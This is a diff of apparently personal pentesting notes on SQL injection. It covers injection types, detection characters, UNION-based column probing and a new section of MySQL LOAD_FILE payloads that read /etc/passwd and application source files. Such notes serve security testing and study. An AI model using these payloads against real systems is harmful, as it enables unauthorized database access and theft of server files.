@@ -1,9 +1,18 @@
 # SQL Injection
 
+### Types of SQL Injections
+
+* `In-band` SQL injection, and it has two types: `Union Based` and `Error Based`.
+  * Output of both the intended and the new query may be printed directly on the front end, and we can directly read it.
+* `Blind` SQL injection, and it also has two types: `Boolean Based` and `Time Based`.
+  * We may not get the output printed, so we may utilize SQL logic to retrieve the output character by character.
+* `Out-of-band` SQL injection
+  * We may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there.
+
 ### Detect SQL Injection Vulnerabilities&#x20;
 
-* Submit `'`&#x20;
-* SQL-specific syntax(ASCII(97)), `OR 1=1`
+* Injection Characters:  `'` , `"`, `#`, `;`, `)` , `—` , `%27`, `%22`, `%23`, `%3B`, `%29`  <sup><sub>(Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.)<sub></sup>
+* SQL-specific syntax(ASCII(97)), `OR 1=1` , `'  or '1'='1`
 * Trigger time delays, OAST payloads to trigger out-of-band interaction&#x20;
 
 ### Second-Order SQL injection&#x20;
@@ -15,8 +24,8 @@
 
 ### Retrieving Hidden Data&#x20;
 
-* Use comments syntax to change the logic ('--)&#x20;
-* Use `' OR 1=1--`, `'+OR+1=1--`
+* Use comments syntax to change the logic (`'—` )&#x20;
+* Use `' OR 1=1--` , `'+OR+1=1--`  <sup><sub>(should end with space character)<sub></sup>
 
 ### &#x20;Subverting Application Logic&#x20;
 
@@ -34,13 +43,13 @@
 
 ### Determine the Number of Columns being Displayed using `ORDER BY`&#x20;
 
-* `'+ORDER+BY+1--`&#x20;
-* `'+UNION+SELECT+NULL,NULL--` (append more `NULL` if required)&#x20;
+* `'+ORDER+BY+1--`  <sup><sub>(keep incremeting the value)<sub></sup>
+* `'+UNION+SELECT+NULL,NULL--` <sup><sub>(append more<sub></sup> <sup><sub> </sup><sup><sub>`NULL`<sub></sup> <sup><sub> </sup><sup><sub>if required)<sub></sup>&#x20;
 * Reason for using NULL is because it should be compatible with the data types&#x20;
 
 ### Determine the Data Type of Column&#x20;
 
-* `'+UNION+SELECT+'A',NULL,NULL--`
+* `'+UNION+SELECT+'A',NULL,NULL--`&#x20;
 * Keep changing the position of string and Increase or decrease NULL values
 
 ### Retrieving Multiple Values within Single Column&#x20;
@@ -54,6 +63,13 @@
 * Depending on DB version query changes&#x20;
 * For Oracle - requires `FROM` keyword as a must
 * Use Burp SQL injection cheat sheet
+
+### Reading Files <a href="#reading-files" id="reading-files"></a>
+
+* We can start looking for what privileges we have with that user.
+* We see that the `FILE` privilege is listed for our user, enabling us to read files. <sup><sub>(eg for MySQL)<sub></sup>
+* `SELECT LOAD_FILE('/etc/passwd');`  <sup><sub>(Might need to provide full path)<sub></sup>
+* Example Payload: `' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` , `' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`
 
 ### Blind SQL Injection Detection&#x20;
 
